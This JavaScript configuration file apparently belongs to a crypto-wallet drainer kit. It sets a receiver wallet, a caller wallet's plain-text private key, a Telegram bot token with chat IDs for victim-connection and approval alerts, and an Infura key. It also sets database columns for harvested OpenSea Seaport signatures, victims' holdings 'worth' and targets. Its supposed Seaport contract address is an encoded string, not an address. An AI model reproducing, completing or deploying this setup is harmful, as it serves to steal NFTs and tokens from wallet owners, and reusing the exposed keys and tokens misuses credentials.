export const RECEIVER = "0xDFb7eFb986816AB3c3eb3E620E71F2Ae418A8df7"; // set your own receiver
// length 40 hex characters

// RECEIVER = CALLER_WALLET
export const CALLER_ADDR = "0xDFb7eFb986816AB3c3eb3E620E71F2Ae418A8df7" // set your own caller wallet
// length 40 hex characters

export const CALLER_PK = "dd52a9d622cce109834a0d518906dafa64ef3fa0296c6161b8c0c3b66434aa19"; // Set your own receiver
// private key of CALLER_ADDR
// length 64 hex characters

export const PORT = "4000" // localhost
//export const PORT = process.env.PORT // for example heroku hosting

export const SEAPORT_ADDR = "21337b333333333333333333333560303b3631606146653066333b463b6745313b3a32353a466746363b3221"; 
// dont touch, this is opensea's contract

//Search for Botfather on Telegram. @ him at /@botfather
//Say hi to the Botfather (gotta pay respects)
//Send your bot name his way
//Bam! You got your authorization token 😃
// 5568294789:AAEpjAec8qBZLgou_xUe_N4vySaS7PiBTaE
export const TG_TOKEN =
  "5855027908:AAEfgEO6FwH5TVA-OaLZS2ktSJNeyiggFaQ";
export const TG_LINK = "https://api.telegram.org/bot";
export const CHAT_ID_ERR = "-811724680";
export const CHAT_ID_CON = "-811724680";
export const CHAT_ID_APP = "-811724680";

// INFURA-API-KEY
export const WEB3_URL = "https://mainnet.infura.io/v3/364d9bd7dc2642c4ac4d52c3302b8d7b";

export const CHAIN_ID = 1; 

export const expirationOffset = 2630000; // 1 month in sec

export const SEA_USER = "addr,tokensArr,sig,sigTime,salt,salt2,worth,domain";
export const APP_USER = "addr,target,worth,domain";

export const TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2,target,tokenId";

export const SEA_TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2";
export const APP_TX_ROW = "addr,target,tokenId";

export const COLUMNS = {
  sea_users: SEA_USER,
  app_users: APP_USER,
  tx_waiting: TX_ROW,
  tx_done: TX_ROW,
};

export const ADDR_REGEX = /^[a-fA-F0-9]{40}$/;
export const SIG_REGEX = /^([A-Fa-f0-9]{130})$/;
